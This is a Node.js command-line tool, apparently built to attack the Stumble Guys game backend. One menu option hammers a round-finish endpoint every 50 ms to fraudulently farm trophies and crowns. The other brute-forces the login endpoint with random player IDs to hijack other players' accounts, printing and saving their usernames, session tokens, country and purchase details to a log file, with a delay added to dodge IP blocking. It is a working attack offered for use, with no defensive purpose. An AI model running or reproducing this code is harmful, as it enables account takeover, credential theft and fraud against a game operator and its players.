const fetch = require('node-fetch');
const fs = require('fs');
const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});

const {
    exec
} = require('child_process');

var finishid = "";

var botconnected = 0;

function uid() {
    return (Date.now().toString(36) + Math.random().toString(36)).replace(/\./g, "");
};

function doExploit(id) {
    let auth = JSON.parse(fs.readFileSync("auth.txt"));
    fetch(`/kitkabackend.eastus.cloudapp.azure.com:5010/round/finishv2/${id}`, {
        method: "GET",
        headers: {
            "authorization": JSON.stringify(auth),
            "Host": "kitkabackend.eastus.cloudapp.azure.com:5010",
            "use_response_compression": true,
            "Accept-Encoding": "gzip",
        }
    }).then(resp => resp.json()).then(response => {
        if (response.User.SkillRating != null) {
            botconnected++;
            exec("title Bot Connected [" + botconnected + "]")
            console.log("Username ->" + response.User.Username)
            console.log("Experience (XPS)->" + response.User.Experience)
            console.log("Trophy (count) -> " + response.User.SkillRating)
            console.log("Crown (Count) ->" + response.User.Crowns)
        }
    }).catch(err => console.log("failed ->  \n" + err))
};

function doBrutoForce() {
    fetch('http://kitkabackend.eastus.cloudapp.azure.com:5010/user/login', {
        method: 'POST',
        headers: {
            "use_response_compression": true,
            "Content-Type": "application/json",
            "Host": "kitkabackend.eastus.cloudapp.azure.com:5010",
            "Accept-Encoding": "gzip, deflate",
            "Content-Length": 619,
        },
        body: JSON.stringify({
            "Id": Math.floor(Math.random() * 10 ** (9 - 1), 10 ** 9 - 1),
            "DeviceId": uid(),
            "Version": "0.37",
            "FacebookId": "",
            "GoogleId": "",
        })
    }).then(res => res.json()).then(response => {
        if (response.User.Username != null) {
            console.log("[Exploit] Found Stumble Account -> " + response.User.Username + "\nToken -> " + response.User.Token + "\nCountry -> " + response.User.Country + "\nTrophy ->" + response.User.SkillRating + "\nCrowns ->  " + response.User.Crowns + "\nSkin total -> " + response.User.Skins.length + "\nHas purchased -> " + response.User.BattlePass.HasPurchased + "\n")
            fs.appendFileSync("logs", "[Exploit] Found Stumble Account -> " + response.User.Username + "\nToken -> " + response.User.Token + "\nCountry -> " + response.User.Country + "\nTrophy ->" + response.User.SkillRating + "\nCrowns ->  " + response.User.Crowns + "\nSkin total -> " + response.User.Skins.length + "\nHas purchased -> " + response.User.BattlePass.HasPurchased + "\n");
        }
    }).catch(err => {});
};

function showMenu() {
    console.clear();
    console.log(`
░██████╗████████╗██╗░░░██╗███╗░░░███╗██████╗░██╗░░░░░███████╗  ███████╗██╗░░██╗██████╗░██╗░░░░░░█████╗░██╗████████╗
██╔════╝╚══██╔══╝██║░░░██║████╗░████║██╔══██╗██║░░░░░██╔════╝  ██╔════╝╚██╗██╔╝██╔══██╗██║░░░░░██╔══██╗██║╚══██╔══╝
╚█████╗░░░░██║░░░██║░░░██║██╔████╔██║██████╦╝██║░░░░░█████╗░░  █████╗░░░╚███╔╝░██████╔╝██║░░░░░██║░░██║██║░░░██║░░░
░╚═══██╗░░░██║░░░██║░░░██║██║╚██╔╝██║██╔══██╗██║░░░░░██╔══╝░░  ██╔══╝░░░██╔██╗░██╔═══╝░██║░░░░░██║░░██║██║░░░██║░░░
██████╔╝░░░██║░░░╚██████╔╝██║░╚═╝░██║██████╦╝███████╗███████╗  ███████╗██╔╝╚██╗██║░░░░░███████╗╚█████╔╝██║░░░██║░░░
╚═════╝░░░░╚═╝░░░░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚══════╝  ╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚══════╝░╚════╝░╚═╝░░░╚═╝░░░	
`)

    let mainMenu = "-> 1. Stumble Trophye exploit\n-> 2. Stumble BrutoForce (to gets stumble accounts)\n->"
    readline.question(mainMenu, function(input1) {
        switch (input1) {
            case "1": {
                let menu = "-> 1. First Round (won in 1st round)\n-> 2. Second Round (won in 2nd round)\n-> 3. Won The game\nChoose which round you've done and saved in auth.txt\n->";
                readline.question(menu, function(input) {
                    switch (input) {
                        case "1": {
                            finishid = "1";
                            console.log(`you have chosen (${input})`);
                            return setInterval(() => {
                                doExploit(input);
                            }, 50);
                        }
                        break;

                        case "2": {
                            finishid = "2"
                            console.log(`you have chosen (${input})`);
                            return setInterval(() => {
                                doExploit(input);
                            }, 50);
                        }
                        break;

                        case "3": {
                            finishid = "3"
                            console.log(`you have chosen (${input})`);
                            return setInterval(() => {
                                doExploit(input);
                            }, 50);
                        }
                        break;

                        default: {
                            return console.log("bitch what u want")
                        }
                        break;
                    }
                })
            }
            break;

            case "2": {
                console.clear();
                console.log(`
██████╗░██████╗░██╗░░░██╗████████╗░█████╗░███████╗░█████╗░██████╗░░█████╗░███████╗
██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
██████╦╝██████╔╝██║░░░██║░░░██║░░░██║░░██║█████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░
██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██║░░██║██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░
██████╦╝██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗
╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝`);
                console.log("brutoforce started!")
                return setInterval(() => {
                    doBrutoForce();
                },100);//added timeout due to ipbock
            }
            break;
            default: {
                console.log("bye.");
                return process.exit();
            }
            break;
        }
    })
}

showMenu();

process.on('uncaughtException', function(err) {});
process.on('unhandledRejection', function(err) {});
